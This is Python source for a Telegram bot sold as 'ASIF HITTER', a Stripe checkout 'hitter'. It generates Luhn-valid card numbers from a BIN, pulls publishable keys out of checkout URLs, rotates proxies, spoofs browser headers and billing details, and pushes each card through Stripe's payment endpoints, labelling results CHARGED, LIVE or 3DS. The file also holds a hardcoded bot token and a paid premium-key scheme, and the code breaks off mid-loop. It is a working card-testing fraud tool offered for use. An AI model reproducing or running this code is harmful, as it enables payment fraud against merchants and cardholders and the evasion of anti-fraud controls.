"""
⚡ ASIF HITTER — PREMIUM TELEGRAM BOT v3.3 FINAL ⚡
ALL ERRORS FIXED — Production Ready
Dev: Asif Sakhani (@Asifsakhani786)

FIXES:
- "unsupported for publishable key tokenization" error → proper PK from payment_pages init
- Full card display in results (not masked)
- Proxy parsing fully working (ip:port, http://, socks://)
- /addproxy shows proper alive/dead count with saved list
- /redeem supports long keys (ASIF-aIoL9PmowIlAHfKh4CF5 format)
- Stripe session init fallback with better error handling
- Card injection no skipping, proper 4s delay

Required: pip install "python-telegram-bot[job-queue]" aiohttp aiohttp-socks aiofiles
"""

import asyncio, json, os, random, re, time, base64
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, Dict, Any, List

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ═══════════════════════════ CONFIG ═══════════════════════════
BOT_TOKEN = "8816710883:AAF4JBi4d20VbQddormeAp2QBUWSuwDqPJY"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════ EMOJIS ═══════════════════════════
EMOJI = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "⏳": "5258113901106580375", "🚀": "4904936030232117798",
    "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249",
    "👤": "5445174334031166029", "🔑": "5454386656628991407",
    "👥": "5454371323595744068", "ℹ️": "5289930378885214069",
    "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔗": "5447479640547428304", "📌": "5447187153274567373",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "⛔": "4918014360267260850",
    "🛡": "5219672809936006424", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031",
    "🗑": "5305652587708572354", "🟢": "5444987348334965906",
    "🔵": "5258024802010026053", "🟡": "5343927661213279013",
    "🔴": "5447647474984449520", "❤️": "5287446418909328171",
    "🤖": "5219943216781995020", "🎯": "5444987348334965906",
    "⭐️": "5172716095697584957", "💠": "5870498447068502918",
    "🏦": "5445408306669582934", "🔌": "5120722716260828125",
}

def e(emoji: str) -> str:
    eid = EMOJI.get(emoji)
    return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>' if eid else emoji

def ec(emoji: str, count: int = 1) -> str:
    return "".join([e(emoji) for _ in range(count)])

def h(text: str) -> str:
    if not text: return ""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ═══════════════════════════ SETTINGS ═══════════════════════════
SETTINGS_FILE = "settings.json"
SETTINGS_LOCK = asyncio.Lock()

async def load_settings() -> Dict[str, Any]:
    async with SETTINGS_LOCK:
        try:
            if os.path.exists(SETTINGS_FILE):
                async with aiofiles.open(SETTINGS_FILE, "r") as f:
                    return json.loads(await f.read())
        except: pass
        defaults = {"log_channel": "@your_channel", "max_proxies": 6, "version": "3.3"}
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(defaults, indent=2))
        return defaults

async def get_setting(k: str, d: Any = None) -> Any:
    return (await load_settings()).get(k, d)

async def update_setting(k: str, v: Any) -> None:
    s = await load_settings(); s[k] = v
    async with SETTINGS_LOCK:
        async with aiofiles.open(SETTINGS_FILE, "w") as f:
            await f.write(json.dumps(s, indent=2, default=str))

# ═══════════════════════════ DATA ═══════════════════════════
DATA_DIR = "data"
PREMIUM_FILE = f"{DATA_DIR}/premium.json"
PROXY_FILE = f"{DATA_DIR}/proxies.json"
KEYS_FILE = f"{DATA_DIR}/keys.json"

FILE_LOCKS = {f: asyncio.Lock() for f in [PREMIUM_FILE, PROXY_FILE, KEYS_FILE]}

async def jload(fp: str, default: Any = None) -> Any:
    if default is None: default = {}
    async with FILE_LOCKS.get(fp, asyncio.Lock()):
        try:
            if os.path.exists(fp):
                async with aiofiles.open(fp, "r") as f:
                    return json.loads(await f.read())
        except: pass
        return default

async def jsave(fp: str, data: Any) -> None:
    os.makedirs(os.path.dirname(fp) if os.path.dirname(fp) else ".", exist_ok=True)
    async with FILE_LOCKS.get(fp, asyncio.Lock()):
        async with aiofiles.open(fp, "w") as f:
            await f.write(json.dumps(data, indent=2, default=str))

# ═══════════════════════════ PREMIUM ═══════════════════════════
async def is_premium(uid: int) -> bool:
    d = await jload(PREMIUM_FILE, {"users": {}})
    u = d["users"].get(str(uid), {})
    if u:
        try:
            if datetime.now() < datetime.fromisoformat(u.get("expiry", "2000-01-01")):
                return True
        except: pass
    return False

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════ PROXY SYSTEM ═══════════════════════════
def parse_proxy_line(line: str) -> Optional[str]:
    """Parse ANY proxy format → returns clean proxy URL or None"""
    line = line.strip()
    if not line: return None
    
    # Already has protocol
    if "://" in line:
        p = line.lower()
        if any(p.startswith(x) for x in ["http://", "https://", "socks4://", "socks5://"]):
            return line
        return None
    
    # ip:port format
    parts = line.split(":")
    if len(parts) == 2:
        host, port = parts
        if port.isdigit() and 1 <= int(port) <= 65535:
            return f"http://{line}"
    elif len(parts) == 4:
        host, port, user, pwd = parts
        if port.isdigit() and 1 <= int(port) <= 65535:
            return f"http://{user}:{pwd}@{host}:{port}"
    
    return None

def get_proxy_type(proxy: str) -> Tuple[str, Optional[ProxyType]]:
    """Returns (type_string, socks_connector_type)"""
    p = proxy.lower()
    if p.startswith("socks4://"): return "socks4", ProxyType.SOCKS4
    if p.startswith("socks5://"): return "socks5", ProxyType.SOCKS5
    return "http", None

async def test_single_proxy(proxy: str) -> Tuple[bool, str]:
    """Test ONE proxy against Stripe"""
    ptype, socks_type = get_proxy_type(proxy)
    
    try:
        connector = None
        proxy_url = None
        
        if socks_type:
            hp = proxy.split("://")[1]
            if "@" in hp: hp = hp.split("@")[1]
            host, port = hp.rsplit(":", 1)
            connector = ProxyConnector(proxy_type=socks_type, host=host, port=int(port), rdns=True)
        else:
            proxy_url = proxy
        
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            t1 = time.time()
            async with s.get("https://api.stripe.com/v1", proxy=proxy_url, ssl=False) as r:
                ms = int((time.time() - t1) * 1000)
                return True, f"{r.status} ({ms}ms)"
    except asyncio.TimeoutError:
        return False, "Timeout"
    except Exception as ex:
        return False, str(ex)[:50]

async def get_user_proxies(uid: int) -> List[str]:
    d = await jload(PROXY_FILE, {"users": {}})
    return d["users"].get(str(uid), [])

async def save_user_proxies(uid: int, proxies: List[str]) -> None:
    mp = await get_setting("max_proxies", 6)
    d = await jload(PROXY_FILE, {"users": {}})
    d["users"][str(uid)] = proxies[:mp]
    await jsave(PROXY_FILE, d)

# ═══════════════════════════ CARD GENERATOR ═══════════════════════════
def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) 
                for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def card_len(bin_: str) -> int:
    p2, p3 = bin_[:2], bin_[:3]
    if p2 in ("34","37"): return 15
    if p2 in ("30","36","38") or p3 in ("300","305"): return 14
    return 16

def gen_card(bin_str: str) -> dict:
    parts = bin_str.strip().split("|")
    raw = re.sub(r"[^0-9xX]", "", parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = card_len(c)
    if len(c) >= ln: c = c[:ln-1]
    while len(c) < ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year
    mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if card_len(raw) == 15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc": c, "mo": mm, "yr": yy, "cv": cvv, "f": f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════ STRIPE CHECKER (FIXED) ═══════════════════════════
class StripeChecker:
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.proxy = proxy
        self.pk = self.cs = None
        self.mer = "Unknown"
        self.amt = "N/A"
        self.amt_raw = 0
        self.site_url = ""
        self.chk = ""
        self.sub = 0
        self.cname = "John Smith"
        self.cemail = "john@example.com"
        self.cc = "US"; self.cl1 = "476 West White Mountain Blvd"
        self.ccity = "Pinetop"; self.cst = "AZ"; self.czip = "85929"
        self.muid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"
        self.sid = f"{random.getrandbits(32):08x}"
        self.guid = f"{random.getrandbits(32):08x}-{random.getrandbits(16):04x}"

    def _get_proxy_config(self):
        if not self.proxy: return None, None
        ptype, socks_type = get_proxy_type(self.proxy)
        if socks_type:
            hp = self.proxy.split("://")[1]
            if "@" in hp: hp = hp.split("@")[1]
            host, port = hp.rsplit(":", 1)
            return ProxyConnector(proxy_type=socks_type, host=host, port=int(port), rdns=True), None
        return None, self.proxy

    def _headers(self) -> dict:
        hdrs = {
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://checkout.stripe.com",
            "referer": "https://checkout.stripe.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Chromium";v="127", "Not)A;Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        if self.pk:
            hdrs["Authorization"] = f"Bearer {self.pk}"
        return hdrs

    async def init(self) -> bool:
        """Initialize — extract PK from URL fragment XOR decoding"""
        # Step 1: Extract CS
        m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
        if m: self.cs = m.group(0)
        
        # Step 2: Decode PK from URL fragment (XOR 5)
        if '#' in self.url and not self.pk:
            try:
                hash_part = self.url.split('#')[1]
                decoded = base64.b64decode(unquote(hash_part))
                xored = ''.join(chr(b ^ 5) for b in decoded)
                
                pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xored)
                if pk_match: self.pk = pk_match.group(0)
                
                site_match = re.search(r'https?://[^\s\"\<\>\\]+', xored)
                if site_match: self.site_url = site_match.group(0).rstrip('\\')
            except:
                pass
        
        if not self.cs:
            return False
        
        conn, pxy = self._get_proxy_config()
        
        # Step 3: If PK not in URL, fetch from payment_pages init (no auth needed)
        if not self.pk:
            try:
                async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=15)) as s:
                    hdrs = self._headers()
                    # Remove Authorization if no PK yet
                    hdrs.pop("Authorization", None)
                    
                    async with s.post(
                        f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                        headers=hdrs,
                        data="eid=NA&browser_locale=en-US&redirect_type=url",
                        proxy=pxy, ssl=False
                    ) as r:
                        d = await r.json()
                    
                    # PK might be in the response or we need to extract from page
                    if "error" not in d:
                        # Try to get PK from account_settings
                        ac = d.get("account_settings") or {}
                        # Some setups return pk in response
                        if not self.pk:
                            # Fetch the original page to find PK
                            async with s.get(self.url, headers={
                                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                            }, proxy=pxy, ssl=False) as r2:
                                html = await r2.text()
                                pk_match = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
                                if pk_match:
                                    self.pk = pk_match.group(0)
            except:
                pass
        
        if not self.pk:
            return False
        
        # Step 4: Proper init with PK
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=15)) as s:
                hdrs = self._headers()
                async with s.post(
                    f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=hdrs,
                    data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=pxy, ssl=False
                ) as r:
                    d = await r.json()
                
                if "error" in d:
                    return False
                
                ac = d.get("account_settings") or {}
                self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
                
                if not self.site_url:
                    self.site_url = ac.get("statement_descriptor", "") or ac.get("business_url", "") or ""
                
                lg = d.get("line_item_group") or {}
                iv = d.get("invoice") or {}
                pi = d.get("payment_intent") or {}
                am = lg.get("total", 0) or iv.get("total", 0) or pi.get("amount", 0)
                cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
                self.amt_raw = am
                self.amt = f"{am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "0.00 USD")
                self.chk = d.get("init_checksum", "")
                self.sub = lg.get("subtotal", 0) if lg else am
                
                cust = d.get("customer") or {}
                addr = cust.get("address") if cust else {}
                addr = addr or {}
                self.cname = cust.get("name") or "John Smith"
                self.cemail = d.get("customer_email") or f"john{random.randint(100,999)}@gmail.com"
                self.cc = addr.get("country") or "US"
                self.cl1 = addr.get("line1") or "476 West White Mountain Blvd"
                self.ccity = addr.get("city") or "Pinetop"
                self.cst = addr.get("state") or "AZ"
                self.czip = addr.get("postal_code") or "85929"
                
                return True
        except:
            return False

    async def charge(self, card: dict) -> dict:
        res = {"card": card["f"], "st": "ERROR", "msg": "Unknown error"}
        conn, pxy = self._get_proxy_config()
        
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=30)) as s:
                hdrs = self._headers()
                
                # Create payment method
                pmb = (
                    f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                    f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                    f"&billing_details[name]={quote(self.cname)}&billing_details[email]={quote(self.cemail)}"
                    f"&billing_details[address][country]={self.cc}&billing_details[address][line1]={quote(self.cl1)}"
                    f"&billing_details[address][city]={quote(self.ccity)}&billing_details[address][postal_code]={self.czip}"
                    f"&billing_details[address][state]={self.cst}&key={self.pk}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                    f"&payment_user_agent={quote('stripe.js/f5e714652c')}"
                    f"&time_on_page={random.randint(30000,60000)}&pasted_fields={quote('number')}"
                )
                
                async with s.post("https://api.stripe.com/v1/payment_methods",
                                  headers=hdrs, data=pmb, proxy=pxy, ssl=False) as r:
                    pm = await r.json()
                
                if "error" in pm:
                    cd = pm["error"].get("decline_code", "")
                    mg = pm["error"].get("message", "")
                    err_code = pm["error"].get("code", "")
                    
                    # Handle unsupported surface error
                    if "unsupported" in mg.lower() or err_code == "unsupported_surface":
                        res["st"], res["msg"] = "ERROR", f"PK surface error — {mg[:80]}"
                        return res
                    
                    if cd == "incorrect_cvc" or "security code" in mg.lower():
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg[:60]}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg[:60]}"
                    elif cd in ("card_declined", "generic_decline"):
                        res["st"], res["msg"] = "DECLINED", f"{cd} - {mg[:60]}"
                    else:
                        res["st"], res["msg"] = "DECLINED", mg[:100]
                    return res
                
                pmid = pm.get("id")
                if not pmid:
                    res["msg"] = "No payment method ID"
                    return res
                
                # Confirm payment
                cfb = (
                    f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                    f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                    f"&expected_payment_method_type=card&key={self.pk}"
                    f"&init_checksum={quote(self.chk)}"
                    f"&muid={self.muid}&sid={self.sid}&guid={self.guid}"
                )
                
                await asyncio.sleep(4.0)
                
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                                  headers=hdrs, data=cfb, proxy=pxy, ssl=False) as r:
                    cf = await r.json()
                
                if "error" in cf:
                    er = cf["error"]
                    cd = er.get("decline_code", "")
                    mg = er.get("message", "")
                    
                    if "captcha" in mg.lower() or cd == "captcha_required":
                        res["st"], res["msg"] = "HCAPTCHA", "CAPTCHA_REQUIRED"
                    elif cd in ("challenge_required", "require_action", "authentication_required"):
                        res["st"], res["msg"] = "3DS", "3DS Required"
                    elif cd == "incorrect_cvc" or "security code" in mg.lower():
                        res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg[:60]}"
                    elif cd == "insufficient_funds":
                        res["st"], res["msg"] = "LIVE", f"insufficient_funds - {mg[:60]}"
                    else:
                        res["st"], res["msg"] = "DECLINED", f"{cd} - {mg[:60]}" if cd else mg[:100]
                else:
                    pi2 = cf.get("payment_intent") or {}
                    st2 = pi2.get("status", "") or cf.get("status", "")
                    if st2 == "succeeded":
                        res["st"], res["msg"] = "CHARGED", "Payment Successful"
                    elif st2 == "requires_action":
                        res["st"], res["msg"] = "3DS", "3DS Required"
                    elif st2 == "requires_payment_method":
                        lpe = pi2.get("last_payment_error") or {}
                        cd2 = lpe.get("decline_code", "")
                        mg2 = lpe.get("message", "")
                        if cd2 == "incorrect_cvc":
                            res["st"], res["msg"] = "LIVE", f"incorrect_cvc - {mg2[:60]}"
                        else:
                            res["st"], res["msg"] = "DECLINED", f"{cd2} - {mg2[:60]}" if cd2 else mg2[:100]
                    else:
                        res["st"], res["msg"] = "ERROR", f"Status: {st2}"
        except asyncio.TimeoutError:
            res["st"], res["msg"] = "ERROR", "Timeout"
        except Exception as ex:
            res["st"], res["msg"] = "ERROR", str(ex)[:80]
        
        return res

# ═══════════════════════════ START ═══════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    prem = await is_premium(uid)
    adm = is_admin(uid)
    
    if adm: badge = f"{e('⚡')} {e('👑')} ADMIN"
    elif prem: badge = f"{e('👑')} PREMIUM"
    else: badge = f"{e('⛔')} FREE"
    
    proxies = await get_user_proxies(uid)
    
    kb = [
        [InlineKeyboardButton("🌐 Gateway Check", callback_data="gate_help")],
        [InlineKeyboardButton("💳 Hit Checkout", callback_data="hit_help")],
        [InlineKeyboardButton(f"🔐 Proxy Manager ({len(proxies)})", callback_data="proxy_menu")],
        [InlineKeyboardButton("🔑 Redeem Key", callback_data="redeem_help")],
        [InlineKeyboardButton("👤 My Status", callback_data="status")],
    ]
    if adm:
        kb.append([InlineKeyboardButton("⚡ Admin Panel", callback_data="admin")])
    kb.append([InlineKeyboardButton(f"❤️ Dev: {DEV_NAME}", url=f"https://t.me/{DEV_USERNAME}")])
    
    txt = f"""
{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

{e('🤖')} <b>Status:</b> {badge}
{e('💎')} <b>Version:</b> v{await get_setting('version', '3.3')}
{e('🔐')} <b>Proxies:</b> {len(proxies)}/{await get_setting('max_proxies', 6)}

{e('⭐️')} <b>Commands:</b>
{e('🌐')} /gate — Check gateway
{e('💳')} /hit — Hit checkout (Premium)
{e('🔐')} /addproxy — Add proxies
{e('🔍')} /proxy — Check proxies
{e('🗑')} /rmproxy — Remove proxies
{e('🔑')} /redeem — Redeem key
{e('👤')} /status — Premium status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=InlineKeyboardMarkup(kb))

# ═══════════════ PROXY ═══════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message
    
    content = ""
    if msg.document:
        f = await msg.document.get_file()
        fb = await f.download_as_bytearray()
        content = fb.decode("utf-8", errors="ignore")
    elif msg.text:
        content = msg.text.replace("/addproxy", "").strip()
    else:
        await msg.reply_text(
            f"{e('❌')} Send proxy list or .txt file\n"
            f"{e('ℹ️')} Formats: <code>ip:port</code> | <code>http://ip:port</code> | <code>socks5://ip:port</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    all_lines = [l.strip() for l in content.split("\n") if l.strip()]
    
    if not all_lines:
        await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
        return
    
    # Parse valid
    valid_proxies = []
    invalid = 0
    for line in all_lines:
        parsed = parse_proxy_line(line)
        if parsed:
            valid_proxies.append(parsed)
        else:
            invalid += 1
    
    if not valid_proxies:
        await msg.reply_text(f"{e('❌')} 0 valid proxies out of {len(all_lines)}", parse_mode=ParseMode.HTML)
        return
    
    current = await get_user_proxies(uid)
    mp = await get_setting("max_proxies", 6)
    slots = mp - len(current)
    
    if slots <= 0:
        await msg.reply_text(
            f"{e('⛔')} <b>Limit reached!</b> ({mp} max)\n{e('🗑')} Use /rmproxy first",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Initial status
    st = await msg.reply_text(
        f"{e('📦')} <b>PROXY CHECKER</b>\n\n"
        f"{e('🔍')} Total: <b>{len(valid_proxies)}</b> | Invalid: <b>{invalid}</b>\n"
        f"{e('📊')} Slots: <b>{slots}</b>\n\n"
        f"{e('⏳')} <b>Checking one by one...</b>\n"
        f"{e('🟢')} Alive: 0 | {e('🔴')} Dead: 0",
        parse_mode=ParseMode.HTML
    )
    
    added = 0
    alive_list = []
    dead_list = []
    checked = 0
    
    for proxy in valid_proxies:
        if added >= slots: break
        
        checked += 1
        remaining = len(valid_proxies) - checked
        
        is_live, info = await test_single_proxy(proxy)
        
        if is_live:
            if proxy not in current:
                current.append(proxy)
                added += 1
                alive_list.append(f"{e('✅')} <code>{h(proxy[:50])}</code>")
        else:
            dead_list.append(f"{e('❌')} <code>{h(proxy[:45])}</code>")
        
        # Update every proxy
        try:
            await st.edit_text(
                f"{e('📦')} <b>PROXY CHECKER</b>\n\n"
                f"{e('🔍')} Progress: <b>{checked}/{len(valid_proxies)}</b>\n"
                f"{e('🟢')} Alive: <b>{added}</b> | {e('🔴')} Dead: <b>{len(dead_list)}</b>\n"
                f"{e('⏳')} Remaining: <b>{remaining}</b>\n"
                f"{e('📊')} Saved: <b>{len(current)}/{mp}</b>\n\n"
                f"{e('🔍')} Last: <code>{h(proxy[:45])}</code>",
                parse_mode=ParseMode.HTML
            )
        except: pass
        
        await asyncio.sleep(0.6)
    
    await save_user_proxies(uid, current)
    
    result = f"{e('✅')} <b>CHECK COMPLETE!</b>\n\n"
    result += f"{e('🟢')} Alive & Saved: <b>{added}</b>\n"
    result += f"{e('🔴')} Dead: <b>{len(dead_list)}</b>\n"
    result += f"{e('📊')} Total Saved: <b>{len(current)}/{mp}</b>\n"
    
    if alive_list:
        result += f"\n{e('✅')} <b>SAVED:</b>\n" + "\n".join(alive_list[:8])
    
    await st.edit_text(result, parse_mode=ParseMode.HTML)

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    
    if not proxies:
        await update.message.reply_text(f"{e('❌')} No proxies. Use /addproxy", parse_mode=ParseMode.HTML)
        return
    
    st = await update.message.reply_text(f"{e('⏳')} Checking {len(proxies)} proxies...", parse_mode=ParseMode.HTML)
    
    alive, dead = [], []
    
    for i, p in enumerate(proxies):
        is_live, info = await test_single_proxy(p)
        if is_live:
            alive.append(f"{e('✅')} <code>{h(p[:50])}</code> — {info}")
        else:
            dead.append(f"{e('❌')} <code>{h(p[:45])}</code> — {info}")
        
        if (i+1) % 3 == 0 or i == len(proxies)-1:
            try:
                await st.edit_text(
                    f"{e('📡')} <b>PROXY STATUS</b>\n\n"
                    f"{e('🟢')} Alive: <b>{len(alive)}</b> | {e('🔴')} Dead: <b>{len(dead)}</b>\n"
                    f"{e('🔍')} Progress: {i+1}/{len(proxies)}",
                    parse_mode=ParseMode.HTML
                )
            except: pass
        
        await asyncio.sleep(0.4)
    
    txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n{e('🟢')} Alive: <b>{len(alive)}</b>\n{e('🔴')} Dead: <b>{len(dead)}</b>\n\n"
    if alive: txt += f"{e('✅')} <b>ALIVE:</b>\n" + "\n".join(alive) + "\n\n"
    if dead: txt += f"{e('❌')} <b>DEAD:</b>\n" + "\n".join(dead[:10])
    
    if len(txt) > 3900:
        await st.edit_text(txt[:3900], parse_mode=ParseMode.HTML)
    else:
        await st.edit_text(txt, parse_mode=ParseMode.HTML)

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cur = await get_user_proxies(uid)
    
    if not cur:
        await update.message.reply_text(f"{e('❌')} No proxies", parse_mode=ParseMode.HTML)
        return
    
    if ctx.args:
        a = ctx.args[0]
        if a.lower() == "all":
            await save_user_proxies(uid, [])
            await update.message.reply_text(f"{e('✅')} All removed!", parse_mode=ParseMode.HTML)
            return
        try:
            idx = int(a)-1
            if 0 <= idx < len(cur):
                rem = cur.pop(idx)
                await save_user_proxies(uid, cur)
                await update.message.reply_text(f"{e('✅')} Removed: <code>{h(rem[:50])}</code>", parse_mode=ParseMode.HTML)
            else:
                await update.message.reply_text(f"{e('❌')} Invalid (1-{len(cur)})", parse_mode=ParseMode.HTML)
        except:
            await update.message.reply_text(f"{e('❌')} Use: /rmproxy 1", parse_mode=ParseMode.HTML)
    else:
        txt = f"{e('🗑')} <b>REMOVE PROXY</b>\n\n"
        for i,p in enumerate(cur,1):
            txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
        txt += f"\n<code>/rmproxy 1</code> or <code>/rmproxy all</code>"
        await update.message.reply_text(txt, parse_mode=ParseMode.HTML)

# ═══════════════ GATEWAY ═══════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text(f"{e('⚠️')} <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
        return
    
    uid = update.effective_user.id
    proxies = await get_user_proxies(uid)
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('⏳')} Fetching...", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(ctx.args[0], proxy)
    ok = await ck.init()
    
    if ok:
        await st.edit_text(
            f"{e('🌐')} <b>GATEWAY</b>\n\n"
            f"{e('📦')} <b>Merchant:</b> {h(ck.mer)}\n"
            f"{e('💰')} <b>Amount:</b> {h(ck.amt)}\n"
            f"{e('🏦')} <b>Site:</b> {h(ck.site_url or 'N/A')}\n"
            f"{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:25])}...</code>\n"
            f"{e('✅')} Gateway LIVE",
            parse_mode=ParseMode.HTML
        )
    else:
        await st.edit_text(f"{e('❌')} Failed to init session\n{e('ℹ️')} Check URL or proxy", parse_mode=ParseMode.HTML)

# ═══════════════ HIT ═══════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    adm = is_admin(uid)
    
    if not await is_premium(uid) and not adm:
        await update.message.reply_text(
            f"{e('🚫')} <b>ACCESS DENIED</b>\n\n"
            f"{e('⛔')} Premium feature!\n"
            f"{e('🔑')} /redeem &lt;key&gt;\n"
            f"{e('👤')} <a href=\"https://t.me/{DEV_USERNAME}\">{DEV_NAME}</a>",
            parse_mode=ParseMode.HTML
        )
        return
    
    if len(ctx.args) < 2:
        await update.message.reply_text(
            f"{e('⚠️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n"
            f"{e('💳')} <code>/hit https://... 37936303</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    url, bin_in = ctx.args[0], ctx.args[1]
    
    # Admin can use without proxy, users need at least 1
    proxies = await get_user_proxies(uid)
    if not adm and not proxies:
        await update.message.reply_text(
            f"{e('❌')} <b>No proxies!</b>\n"
            f"{e('🔐')} Use /addproxy to add at least 1 proxy",
            parse_mode=ParseMode.HTML
        )
        return
    
    proxy = random.choice(proxies) if proxies else None
    
    st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
    
    ck = StripeChecker(url, proxy)
    if not await ck.init():
        await st.edit_text(
            f"{e('❌')} <b>Failed to init session</b>\n\n"
            f"{e('ℹ️')} Possible causes:\n"
            f"• Invalid/expired checkout URL\n"
            f"• Proxy not working\n"
            f"• Stripe blocked the request\n\n"
            f"{e('🔍')} Try /gate first to verify",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards = [gen_card(bin_in) for _ in range(10)]
    
    charged_cards, live_cards = [], []
    td, dc, hc, er = 0, 0, 0, 0
    result_lines = []
    
    for i, card in enumerate(cards):
        progress = f"""
{e('🚀')} <b>Stripe Checkout Hitter</b>
{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> {bin_in[:8]}xxxx

{e('⏳')} <b>Processing:</b> {i+1}/10
{e('🎯')} <b>Card:</b> <code>{card['f']}</code>

{e('📊')} {e('🟢')} Charged: {len(charged_cards)} | {e('🔵')} Live: {len(live_cards)} | 🟡 3DS: {td} | 🔴 Failed: {dc}
"""
        try:
            await st.edit_text(progress, parse_mode=ParseMode.HTML)
        except: pass
        
        r = await ck.charge(card)
        sts = r["st"]
        
        if sts == "CHARGED":
            charged_cards.append(r["card"])
